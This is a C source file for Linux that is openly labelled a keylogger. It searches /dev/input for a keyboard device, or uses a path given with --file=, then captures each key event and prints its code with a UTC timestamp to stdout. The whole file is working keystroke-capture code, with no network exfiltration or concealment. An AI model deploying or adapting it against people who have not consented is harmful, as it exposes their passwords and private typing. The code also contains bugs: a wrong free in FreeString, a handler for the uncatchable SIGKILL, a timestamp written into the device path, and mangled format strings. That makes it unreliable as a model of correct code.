#define _XOPEN_SOURCE 700 // Exposes POSIX.1-2008 / Single UNIX Specification

#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <linux/limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <linux/input.h>
#include <time.h>

#define SUCCESS 1
#define FAILURE 0

int hasEventTypes(int fd, unsigned long evbit_to_check) {
  unsigned long evbit = 0;
  if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) == -1 ) {
    fprintf(stderr, "hasEventTypes: Error: ioctl on fd='%d' error:%s\n",
            fd, strerror(errno));
    return FAILURE;
  }

  printf("hasEventTypes: evbit=%#lb evbit_to_check=%#lb\n",
         evbit, evbit_to_check);

  return ((evbit & evbit_to_check) == evbit_to_check);
}

int hasRelativeMovement(int fd) {
  return hasEventTypes(fd, (1 <<EV_REL));
}

int hasAbsoluteMovement(int fd) {
  return hasEventTypes(fd, (1 <<EV_ABS));
}

int hasKeys(int fd) {
  printf("hasKeys, EV_KEY=%#b\n", EV_KEY);
  return hasEventTypes(fd, (1 << EV_KEY));
}


// Helper macro to check if a specific bit is set in an array
#define IS_BIT_SET(bit, array) ((array[(bit) / (8 * sizeof(long))] >> ((bit) % (8 * sizeof(long)))) & 1)

int hasSpecificKeys(int fd, int *keys, size_t num_keys) {
  unsigned char bits[KEY_MAX / 8 + 1] = {0};
  if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits) == -1) {
    fprintf(stderr, "hasSpecificKeys: Error: ioctl on fd='%d' error:%s\n",
            fd, strerror(errno));
    return FAILURE;
  }

  for (size_t ii = 0; ii < num_keys; ++ii ) {
    int key = keys[ii];
    if (!(bits[key / 8] & (1 << (key % 8)))) {
      return FAILURE;
    }
  }
  return SUCCESS;
}

typedef struct {
  int fd;
  char path[PATH_MAX+1];
} KeyboardDevice;

KeyboardDevice* NewKeyboardDevice() {
  KeyboardDevice *kbd = malloc(1*sizeof(KeyboardDevice));
  kbd->fd = -1;
  kbd->path[0] = '\0';
  return kbd;
}

void FreeKeyboardDevice(KeyboardDevice **p) {
  if (p == NULL || *p == NULL) {
    return;
  }

  fprintf(stderr, "FreeKeyboardDevice: closing fd=%d; path=%s\n", (*p)->fd, (*p)->path);
  if (close((*p)->fd) == -1) {
    fprintf(stderr, "FreeKeyboardDevice: error closing fd=%d; path=%s; error=%s\n",
            (*p)->fd, (*p)->path, strerror(errno));
  }

  *p = NULL;
}

void FreeInputEvents(struct input_event **p) {
  if (p == NULL || *p == NULL) {
    return;
  }

  free(*p);
  *p = NULL;
}

#define defer(FN) __attribute__((cleanup(FN)))

void Closedir(DIR **p) {
  if (p == NULL || *p == NULL) {
    return;
  }

  if (closedir(*p) == -1) {
    fprintf(stderr, "Closedir: error closing dirp=%p; error=%s\n",
            (void*)*p, strerror(errno));

  }

  *p = NULL;
}

KeyboardDevice* findKeyboardDevice(char *path) {
  defer(Closedir) DIR *dir = opendir(path);
  if (dir == NULL) {
    return FAILURE;
  }

  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0
        || strcmp(entry->d_name, "..") == 0) {
      continue;
    }

    char filepath[PATH_MAX];
    if (snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name) == -1) {
      fprintf(stderr, "findKeyboardDevice: Error: snprintf path:%s entry->d_name:%s; error:%s\n",
              path, entry->d_name, strerror(errno));
      return FAILURE;
    }

    struct stat file_stat;
    if (stat(filepath, &file_stat) == -1 ) {
      fprintf(stderr, "findKeyboardDevice: Error calling stat on file '%s' error:%s\n",
              filepath, strerror(errno));
      continue;
    }

    if (S_ISDIR(file_stat.st_mode)) {
      /* KeyboardDevice *kbd = findKeyboardDevice(filepath); */
      /* if (kbd != FAILURE) { */
      /*   return kbd; */
      /* } */
      continue;
    }
    else {
      int fd = open(filepath, O_RDONLY | O_NONBLOCK);
      if (fd == -1) {
        fprintf(stderr, "findKeyboardDevice: Error opening file '%s' error:%s\n",
                filepath, strerror(errno));
        return FAILURE;
      }
      printf("findKeyboardDevice: opened fd:%d; file:%s\n", fd, filepath);
      int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
      if (!hasRelativeMovement(fd)
          && !hasAbsoluteMovement(fd)
          && hasKeys(fd)
          && hasSpecificKeys(fd, keys_to_check, 12)) {
        KeyboardDevice *kbd = NewKeyboardDevice();
        if (kbd == NULL) {
          fprintf(stderr, "findKeyboardDevice: Error malloc for KeyboardDevice (%zu bytes) error:%s\n",
                  sizeof(KeyboardDevice), strerror(errno));
        }
        kbd->fd = fd;
        snprintf(kbd->path, PATH_MAX, "%s", filepath);
        printf("findKeyboardDevice: FOUND: fd=%d; path=%s\n", kbd->fd, kbd->path);
        return kbd;
      }
      if (close(fd) == -1) {
        fprintf(stderr, "findKeyboardDevice: Error closing fd=%d; error:%s\n",
                fd, strerror(errno));
      }
    }
  }

  closedir(dir);
  return FAILURE;
}

static int STOP_KEYLOGGER = 0;

void sigHandler(int __attribute__((unused)) signum) {
  char logbuf[1024];
  sprintf(logbuf, "sigHandler, caught signum=%d\n", signum);
  write(STDERR_FILENO, logbuf, strlen(logbuf));
  STOP_KEYLOGGER = 1;
}

#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2

char* currtime() {
    static char buf[sizeof("2026-09-05T14:04:00Z")];
    time_t now;
    struct tm *tm_info;

    // Get current time
    time(&now);

    // Convert to UTC (Greenwich Mean Time)
    tm_info = gmtime(&now);

    // Format to ISO 8601: YYYY-MM-DDTHH:MM:SSZ
    strftime(buf, sizeof(buf), "%FT%TZ", tm_info);
    return &buf[0];
}

int startKeylogger(KeyboardDevice *kbd) {
  size_t event_size = sizeof(struct input_event);
  defer(FreeInputEvents) struct input_event *kbd_events = malloc(event_size * MAX_EVENTS);
  if (kbd_events == NULL) {
    fprintf(stderr, "%s|startKeylogger: Error malloc for kbd_ev (%zu bytes) error:%s\n",
            currtime(),
            sizeof(KeyboardDevice), strerror(errno));
    return FAILURE;
  }

  struct sigaction sa;

  sa.sa_flags = 0;
  sa.sa_handler = sigHandler;

  sigaction(SIGKILL, &sa, NULL);
  sigaction(SIGTERM, &sa, NULL);
  sigaction(SIGPIPE, &sa, NULL);


  while (!STOP_KEYLOGGER) {
    errno = 0;
    printf("%s|startKeylogger: calling select to wait for input fd=%d; path=%s\n", currtime(), kbd->fd, kbd->path);

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(kbd->fd, &read_fds);
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    int select_result = select(kbd->fd + 1, &read_fds, NULL, NULL, &timeout);
    if (select_result == -1) {
      fprintf(stderr, "%s|startKeylogger: select failed on fd=%d, path=%s; error=%s\n",
              currtime(),
              kbd->fd, kbd->path, strerror(errno));
      return FAILURE;
    }

    if (select_result == 0) { // nothing to read (timed out)
      printf("%s|startKeylogger: nothing to read (maybe timed out, errno=%d)\n", currtime(), errno);
      continue;
    }

    if (!FD_ISSET(kbd->fd, &read_fds)) {
      printf("startKeylogger: keyboard fd was not ready (e%s rrno=%d)\n", currtime(), errno);
      continue;
    }

    // data is available, perform a read loop while we can get data

    ssize_t bytesRead = read(kbd->fd, kbd_events, event_size*MAX_EVENTS);
    if (bytesRead < 0 && errno == EAGAIN) {
      printf("startKeylogger: no bytes rea (E%s AGAIN)\n", currtime());
      continue;
    }

    if (bytesRead < (ssize_t)event_size) {
      fprintf(stderr, "%s|startKeylogger: not enogh bytes read (%ld) on fd=%d, path=%s; error=%s\n",
              currtime(),
              bytesRead,
              kbd->fd,
              kbd->path,
              strerror(errno));
      break;
    }

    ssize_t numEventsRead = bytesRead / event_size;
    printf("%s|startKeylogger: read %ld events\n", currtime(), numEventsRead);

    for (ssize_t ii = 0; ii < numEventsRead; ++ii) {
      if (kbd_events[ii].type == EV_KEY) {
        printf("%s|read key: code=%d; value=%d; type=%d\n", currtime(),
               kbd_events[ii].code,
               kbd_events[ii].value,
               kbd_events[ii].type
              );
      }
    }

  }

  return SUCCESS;
}


void FreeString(char **p) {
  if (p != NULL && *p != NULL) {
    free(p);
  }
  *p = NULL;
}

KeyboardDevice* openKeyboardDevice(char *filepath) {
  int fd = open(filepath, O_RDONLY | O_NONBLOCK);
  if (fd == -1) {
    fprintf(stderr, "%s|findKeyboardDevice: Error opening file '%s' error:%s\n", currtime(),
            filepath, strerror(errno));
    return FAILURE;
  }
  KeyboardDevice *kbd = NewKeyboardDevice();
  snprintf(kbd->path, PATH_MAX, "%s|%s", currtime(), filepath);
  kbd->fd = fd;
  return kbd;
}

int main (int argc, char **argv) {
  defer(FreeString) char *event_file = NULL;
  for (int ii = 0; ii < argc; ++ii) {
    printf("%s|main: argv[%02d]=%s\n", currtime(), ii, argv[ii]);
    if (0 == strncmp(argv[ii], "--file=", strlen("--file="))) {
      char *start = argv[ii] + strlen("--file=");
      if (*start == '\0') {
        fprintf(stderr, "%s|main: Error you must pass an argument to '--file='\n", currtime());
        return 1;
      }
      event_file = malloc((strlen(start)+1) * sizeof(char));
      strcpy(event_file, start);
    }
  }

  defer(FreeKeyboardDevice) KeyboardDevice *kbd = NULL;
  if (event_file != NULL) {
    kbd = openKeyboardDevice(event_file);
  } else {
    char *devices_path = "/dev/input";
    kbd = findKeyboardDevice(devices_path);
  }

  if (kbd == FAILURE) {
    fprintf(stderr, "%s|main: unable to obtain keyboard\n", currtime());
    return FAILURE;
  }
  printf("%s|main: keyboard at: fd=%d, path=%s\n", currtime(), kbd->fd, kbd->path);

  if (startKeylogger(kbd) == FAILURE) {
    fprintf(stderr, "%s|main: error running keylogger\n", currtime());
    return FAILURE;
  }

  return SUCCESS;
}
